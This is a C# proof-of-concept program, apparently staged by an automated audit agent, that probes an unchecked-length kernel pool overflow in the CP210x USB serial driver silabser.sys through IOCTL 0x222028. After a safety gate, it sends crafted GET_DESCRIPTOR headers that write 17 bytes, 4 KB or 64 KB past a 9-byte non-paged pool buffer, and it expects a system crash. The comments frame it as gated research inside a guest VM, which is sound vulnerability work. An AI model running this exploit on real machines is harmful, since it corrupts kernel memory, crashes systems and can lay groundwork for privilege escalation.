// t4_phaseB.cs - DESTRUCTIVE Phase-B probes for silabser.sys IOCTL 0x222028 (agent t4).
// STAGED ONLY during Phase A - agent t4 NEVER executed this program. Execution is
// orchestrator-gated (solo phase; guest death is an accepted possible outcome of B2/B3).
//
// Claim under test (static audit silabser.md section 5.1): handler 0x140004524 parses an
// 8-byte USB control header (byte0 = bmRequestType, +1 bRequest, +2 wValue, +4 wIndex,
// +6 wLength), then wraps (outputBuffer+8) as a wLength-byte WDF preallocated memory for a
// USB control-IN transfer - WITHOUT checking wLength against the 9-byte output buffer.
// With a 9-byte output buffer, out+8 is the LAST valid byte of the METHOD_BUFFERED system
// buffer (non-paged pool): a transfer of N bytes writes N-1 bytes past the allocation.
//
// usage: t4_phaseB.exe <logfile> <step B0|B1|B2|B3> <devicePath>
//   B0 (SAFE gate): 0x222008 (18-B cached descriptor out of 32-B buffer) must succeed,
//                   0x222098 must return removed-flag 0, and 0x222028 with wLength=1
//                   GET_STATUS must complete a live 1-byte control-IN transfer.
//                   Any failure -> exit 3 with "no responding device" message.
//   B1 (17-B OOB):  gate, then 0x222028 in= 80 06 00 01 00 00 12 00
//                   (GET_DESCRIPTOR DEVICE, wLength=18), out=9 B -> 17-byte OOB write
//                   past the non-paged pool buffer. Possible transient damage; request
//                   may even complete; pool integrity now suspect.
//   B2 (4-KB OOB):  gate, then 0x222028 in= 80 06 00 01 00 00 00 10 (wLength=0x1000),
//                   out=9 B -> up to 4 KB of adjacent non-paged pool overwritten with
//                   device-descriptor data. Bugcheck likely (BAD_POOL_HEADER 0x19 family),
//                   silabser.sys expected in the stack.
//   B3 (max OOB):   gate, then 0x222028 in= 80 06 00 01 00 00 FF FF (wLength=0xFFFF),
//                   out=9 B -> up to 65,535-byte OOB write. Run only if B2 was survivable.
// Every log line is flushed to disk BEFORE the destructive call is issued, so evidence
// survives a mid-call BSOD.
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

public class T4PhaseB
{
    static string Log;

    static void L(string s)
    {
        Console.WriteLine(s);
        try { if (Log != null) File.AppendAllText(Log, s + "\r\n"); } catch { }
    }

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    static extern IntPtr CreateFileW(string name, uint desiredAccess, uint shareMode, IntPtr secAttr, uint creationDisposition, uint flags, IntPtr tmpl);
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool DeviceIoControl(IntPtr h, uint code, byte[] inBuf, uint inLen, byte[] outBuf, uint outLen, out uint bytesReturned, IntPtr overlapped);
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool CloseHandle(IntPtr h);
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern uint FormatMessageW(uint flags, IntPtr source, uint msgId, uint langId, StringBuilder buf, uint size, IntPtr args);

    static IntPtr INVALID = (IntPtr)(-1);

    static string ErrText(int err)
    {
        try
        {
            StringBuilder sb = new StringBuilder(1024);
            if (FormatMessageW(0x1000, IntPtr.Zero, (uint)err, 0, sb, 1024, IntPtr.Zero) != 0)
                return sb.ToString().Trim().TrimEnd('\0', '\r', '\n');
        }
        catch { }
        return "";
    }

    static string HexDump(byte[] b, int n)
    {
        if (b == null || n <= 0) return "<none>";
        n = Math.Min(n, b.Length);
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < n; i++) sb.AppendFormat("{0:x2} ", b[i]);
        return sb.ToString().TrimEnd();
    }

    static int Main(string[] args)
    {
        if (args.Length < 4) { Console.WriteLine("usage: t4_phaseB.exe <logfile> <step B0|B1|B2|B3> <devicePath>"); return 2; }
        Log = args[0];
        string step = args[1].ToUpperInvariant();
        string path = args[2];
        try
        {
            L("=== t4_phaseB step " + step + "  " + DateTime.Now.ToString("o") + " ===");
            L("device: " + path);
            IntPtr h = CreateFileW(path, 0xC0000000, 0, IntPtr.Zero, 3, 0, IntPtr.Zero);
            int err = Marshal.GetLastWin32Error();
            if (h == INVALID)
            {
                L(String.Format("open FAILED lastErr={0} ({1}) - cannot proceed", err, ErrText(err)));
                return 2;
            }
            L(String.Format("open OK handle=0x{0:X}", h.ToInt64()));

            if (step == "B0") { int rc = Gate(h); CloseHandle(h); return rc; }

            // B1/B2/B3: mandatory pre-flight gate
            L("--- pre-flight gate (B0 checks re-run before every destructive step) ---");
            if (Gate(h) != 0)
            {
                L("GATE FAILED -> ABORT: no responding device - hardware pass-through or USB emulation required");
                CloseHandle(h);
                return 3;
            }
            L("gate PASSED - proceeding to destructive step " + step);

            byte[] inb;
            string desc;
            if (step == "B1") { inb = new byte[] { 0x80, 0x06, 0x00, 0x01, 0x00, 0x00, 0x12, 0x00 }; desc = "GET_DESCRIPTOR(DEVICE) wLength=18 -> expected 17-byte OOB write past 9-B pool buffer"; }
            else if (step == "B2") { inb = new byte[] { 0x80, 0x06, 0x00, 0x01, 0x00, 0x00, 0x00, 0x10 }; desc = "GET_DESCRIPTOR(DEVICE) wLength=0x1000 -> expected up to 4-KB OOB write; BSOD likely"; }
            else { inb = new byte[] { 0x80, 0x06, 0x00, 0x01, 0x00, 0x00, 0xFF, 0xFF }; desc = "GET_DESCRIPTOR(DEVICE) wLength=0xFFFF -> expected up to 65,535-byte OOB write; BSOD near-certain"; }
            L("step " + step + ": " + desc);
            L("input (8 B): " + HexDump(inb, 8) + "   [log pre-flushed before the call]");
            L("output buffer: 9 B, canary 0xEE fill; out+8 = last valid byte");

            byte[] outB = new byte[9];
            for (int i = 0; i < 9; i++) outB[i] = 0xEE;
            uint ret = 0;
            bool ok = DeviceIoControl(h, 0x222028, inb, 8, outB, 9, out ret, IntPtr.Zero);
            err = Marshal.GetLastWin32Error();
            // if we got here, the guest did not bugcheck inside the call
            L(String.Format("0x222028 RETURNED: ok={0} lastErr={1} ({2}) bytesReturned={3}", ok, err, ErrText(err), ret));
            L("returned bytes : " + HexDump(outB, (int)ret));
            L("full buffer    : " + HexDump(outB, 9));
            CloseHandle(h);
            L("handle closed; guest still alive after step " + step);
            return 0;
        }
        catch (Exception e)
        {
            L("FATAL " + e.GetType().Name + ": " + e.Message);
            return 99;
        }
    }

    // B0 gate: three checks; all must pass for a responding CP210x
    static int Gate(IntPtr h)
    {
        // 1) cached device descriptor
        byte[] o32 = new byte[32];
        for (int i = 0; i < 32; i++) o32[i] = 0xEE;
        uint ret = 0;
        bool ok = DeviceIoControl(h, 0x222008, null, 0, o32, 32, out ret, IntPtr.Zero);
        int err = Marshal.GetLastWin32Error();
        L(String.Format("gate 1/3 0x222008 GET_DEVICE_DESCRIPTOR: ok={0} lastErr={1} ({2}) bytesReturned={3}", ok, err, ErrText(err), ret));
        L("  out: " + HexDump(o32, (int)ret));
        if (!ok || ret < 18) { L("gate 1/3 FAILED"); return 1; }

        // 2) device-removed flag
        byte[] o16 = new byte[16];
        ok = DeviceIoControl(h, 0x222098, null, 0, o16, 16, out ret, IntPtr.Zero);
        err = Marshal.GetLastWin32Error();
        L(String.Format("gate 2/3 0x222098 WAS_DEVICE_REMOVED: ok={0} lastErr={1} flag={2}", ok, err, ret > 0 ? o16[0] : (byte)0xFF));
        if (!ok || ret < 1 || o16[0] != 0) { L("gate 2/3 FAILED (device removed flag != 0)"); return 2; }

        // 3) live control-IN transfer (in-bounds, wLength=1)
        byte[] inb = new byte[] { 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00 };
        byte[] o9 = new byte[9];
        ok = DeviceIoControl(h, 0x222028, inb, 8, o9, 9, out ret, IntPtr.Zero);
        err = Marshal.GetLastWin32Error();
        L(String.Format("gate 3/3 0x222028 wLength=1 GET_STATUS (in-bounds live transfer): ok={0} lastErr={1} bytesReturned={2}", ok, err, ret));
        L("  out: " + HexDump(o9, (int)ret));
        if (!ok || ret < 1) { L("gate 3/3 FAILED (no live control-IN completion)"); return 3; }
        L("gate PASSED - responding device confirmed");
        return 0;
    }
}
